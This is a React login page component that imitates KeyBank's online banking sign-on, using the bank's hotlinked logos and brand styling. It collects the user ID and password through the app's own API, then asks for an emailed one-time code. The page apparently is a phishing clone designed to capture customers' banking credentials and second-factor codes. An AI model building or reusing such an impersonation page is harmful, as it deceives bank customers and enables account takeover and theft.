import { useState } from "react";
import { useLocation } from "wouter";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { api } from "@/lib/api";
import { User, Lock, Shield } from "lucide-react";
import OTPModal from "@/components/OTPModal";
import Footer from "@/components/Footer";

export default function LoginPage() {
  const [, setLocation] = useLocation();
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [showOTP, setShowOTP] = useState(false);
  const [userId, setUserId] = useState<number | null>(null);
  const { toast } = useToast();

  const loginMutation = useMutation({
    mutationFn: ({ username, password }: { username: string; password: string }) =>
      api.auth.login(username, password),
    onSuccess: (data) => {
      if (data.requiresOTP && data.userId) {
        setUserId(data.userId);
        setShowOTP(true);
        toast({
          title: "Verification Required",
          description: "Please check your email for the verification code.",
        });
      } else if (data.user) {
        toast({
          title: "Login Successful",
          description: `Welcome, ${data.user.firstName}!`,
        });
        setLocation("/dashboard");
      }
    },
    onError: (error: any) => {
      toast({
        title: "Login Failed",
        description: error.message || "Invalid credentials. Please try again.",
        variant: "destructive",
      });
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.username || !formData.password) {
      toast({
        title: "Missing Information",
        description: "Please enter both User ID and Password.",
        variant: "destructive",
      });
      return;
    }
    loginMutation.mutate(formData);
  };

  const handleOTPSuccess = () => {
    setShowOTP(false);
    setLocation("/dashboard");
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header Banner */}
      <div className="bg-key-red py-3 text-center">
        <img 
          src="https://ibx.key.com/ibxolb/login/images/key_white_logo.png" 
          alt="KeyBank" 
          className="h-8 mx-auto"
        />
      </div>

      {/* Center Logo */}
      <div className="text-center py-6">
        <img 
          src="https://ibx.key.com/ibxolb/login/images/key-logo.svg" 
          alt="KeyBank" 
          className="h-16 mx-auto"
        />
      </div>

      {/* Login Container */}
      <div className="max-w-md mx-auto p-8">
        <Card className="shadow-key">
          <CardContent className="p-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* User ID Input */}
              <div className="relative">
                <User className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                <Input
                  type="text"
                  placeholder="User ID"
                  value={formData.username}
                  onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                  className="pl-12 py-4 text-base border-key-border focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  required
                />
              </div>

              {/* Password Input */}
              <div className="relative">
                <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                <Input
                  type="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  className="pl-12 py-4 text-base border-key-border focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  required
                />
              </div>

              {/* Sign On Button */}
              <Button
                type="submit"
                className="w-full py-4 bg-key-red hover:bg-red-700 text-white font-bold text-base shadow-button"
                disabled={loginMutation.isPending}
              >
                {loginMutation.isPending ? "Signing In..." : "Sign On"}
              </Button>

              {/* Links */}
              <div className="flex justify-between text-sm">
                <a href="#" className="text-blue-600 hover:underline">
                  Problem Signing On?
                </a>
                <a href="#" className="text-blue-600 hover:underline">
                  Enroll
                </a>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>

      <Footer />

      {/* OTP Modal */}
      {showOTP && userId && (
        <OTPModal
          userId={userId}
          onSuccess={handleOTPSuccess}
          onClose={() => setShowOTP(false)}
        />
      )}
    </div>
  );
}
